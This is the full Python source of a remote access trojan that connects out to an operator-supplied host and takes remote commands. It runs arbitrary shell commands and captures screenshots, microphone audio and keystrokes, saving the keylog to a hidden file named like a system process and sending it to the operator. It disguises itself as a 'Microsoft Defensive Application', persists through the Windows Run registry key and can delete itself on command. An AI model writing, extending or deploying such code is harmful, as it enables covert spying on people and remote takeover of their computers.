import os
import sys
import socket
import threading
import wave
import platform
import subprocess
import uuid
import time
import ctypes
import winreg
import argparse
import json
import io
import shutil
from enum import StrEnum
from datetime import datetime


is_windows = os.name == "nt"

try:
    import pynput
    import pyscreenshot
    import sounddevice
    import requests
    
except ModuleNotFoundError:
    required_modules = [
        "pynput",
        "pyscreenshot",
        "sounddevice",
        "requests"
    ]
    
    subprocess.run(["pip", "install"] + required_modules, shell=True, capture_output=False)
    subprocess.run(["cls" if is_windows else "clear"],  shell=True, capture_output=False)




PROGRAM_NAME = "Microsoft Defensive Application"

FILE_DIR = os.path.abspath(__file__)
KEYLOG_PATH  = os.path.join(os.environ["APPDATA"], "svchost_log.tmp")


curr_dir = os.getcwd()
keylogger_active = False
client_connected = False
audio_samplerate = 44100



parser = argparse.ArgumentParser(prog="Just a kiddie")
parser.add_argument('--host', required=True)
parser.add_argument('--port', required=True, type=int)


class Color(StrEnum):
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    GREEN  = "\033[92m"
    RESET  = "\033[0m"




def get_banner(type, length, extra):
    return f"{type}|{length}|{extra}\n"


def _timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def connect(host, port):
    global client_connected
    
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))  
        client_connected = True          
        
        print(f"{Color.GREEN}[i] Connected at host: {host}{Color.RESET}")
        return client
    
    except Exception as e:
        print(f"{Color.RED}[!] Error while connecting.{Color.RESET}")
        sys.exit(1)
    

def cmd(command):
    result = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, 
    )
    output, err = result.communicate()   
    return output.decode(), err.decode()


def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows')
        os.makedirs(appdata_path, exist_ok=True)

        destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.py')

        if FILE_DIR != os.path.abspath(destination):
            shutil.copy2(FILE_DIR, destination)
            return destination

        return FILE_DIR

    except Exception as e:
        return FILE_DIR
    

def add_to_registry(file_path):
    try:
        winreg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        key = winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=winreg_path,
            reserved=0,
            access=winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(
            key=key,
            value_name=PROGRAM_NAME,
            reserved=0,
            type=winreg.REG_SZ,
            value=file_path 
        )
        winreg.CloseKey(key)
        return True
        
    except Exception as e:
        print(f"{Color.RED}[!] Could not register to WinReg{Color.RESET}")
        return False


def collect_victim_info():    
    hostname = socket.gethostname()
    ip_priv = socket.gethostbyname(hostname)
    ip_pub = requests.get("https://api.ipify.org").text
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    vic_id = str(uuid.uuid1())
    
    return {
        "hostname": hostname,
        "ip_priv": ip_priv,
        "ip_pub": ip_pub,
        "plat": plat,
        "system": system,
        "machine": machine, 
        "vic_id": vic_id
    }
    


def listen_audio():
    
    recording = sounddevice.rec(
        frames=int(10 * audio_samplerate),
        samplerate=audio_samplerate,
        channels=2
    )
    sounddevice.wait()
    return recording


def save_rec(audio):
    filename = "audio_" + _timestamp() + ".wav"
    buf = io.BytesIO()
    
    with wave.open(buf, "wb") as wav_file:
        wav_file.setnchannels(2)
        wav_file.setsampwidth(2)        
        wav_file.setframerate(audio_samplerate)
        wav_file.writeframes(audio.tobytes())

    return filename, buf.getvalue()


def listen_keyboard(client):
    global keylogger_active
    log = []

    def on_press(key):
        log.append(str(key))

    keylogger_active = True
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(60)
    listener.stop()
    keylogger_active = False

    with open(KEYLOG_PATH, "a") as f:
        f.write("\n".join(log))

    ctypes.windll.kernel32.SetFileAttributesW(KEYLOG_PATH, 2)

    with open(KEYLOG_PATH, "rb") as f:
        data = f.read()

    send_packet(
        client=client, 
        type="TMP", 
        filename=os.path.basename(KEYLOG_PATH), 
        data=data
    )


def take_screenshot():
    img = pyscreenshot.grab()
    filename = "screenshot_" + _timestamp() + ".png"

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    
    return filename, buf.getvalue()
    

def send_packet(client: socket.socket , type, filename, data):
    try:
        banner = get_banner(type, len(data), filename)

        client.send(banner.encode())
        client.send(data)

        return True
    
    except Exception as e:
        return False
    

def send_text(client, text):
    send_packet(client, "TEXT", "none", text.encode())


def auto_destroy():
    if is_windows:
        subprocess.run(["TASKKILL", "/F", "/IM",  os.path.basename(FILE_DIR)], shell=True, capture_output=False)
        subprocess.run(["DEL", FILE_DIR], shell=True, capture_output=False)
    else:
        subprocess.run(["rm", "-rf",FILE_DIR], shell=True, capture_output=False)
        
    

def main(host, port):
    file_path = copy_to_system()
    add_to_registry(file_path)
    
    client = connect(host, port)
    info = collect_victim_info()
    client.send(json.dumps(info).encode())


    while True:
        command = client.recv(1024).decode()

        match command:  
            case "/screenshot":
                filename, data = take_screenshot()
                send_packet(
                    client=client, 
                    type="PNG", 
                    filename=filename,
                    data=data
                )
                
            case "/audio":
                audio = listen_audio()
                filename, data = save_rec(audio)
                send_packet(
                    client=client,
                    type="WAV",
                    filename=filename,
                    data=data
                )

            case "/keylog":
                if not keylogger_active:
                    threading.Thread(target=listen_keyboard, args=(client,), daemon=True).start()

            case "/kill":
                auto_destroy()
                break
            
            case _ if command.startswith("cd "):
                try:
                    destiny = command.split()[1]
                    
                    os.chdir(destiny)
                    cwd = os.getcwd()
                    
                    send_packet(
                        client=client, 
                        type="CWD", 
                        filename=cwd, 
                        data=b"ok"
                    )

                except FileNotFoundError | NotADirectoryError:
                    send_text(client, "[!] Directory not found.")
                except PermissionError:
                    send_text(client, "[!] Permission error.")

            case _:
                output, err = cmd(command)
                result = err if err else output

                send_text(client, result)


if __name__ == "__main__":
    args = parser.parse_args()
    main(args.host , args.port)
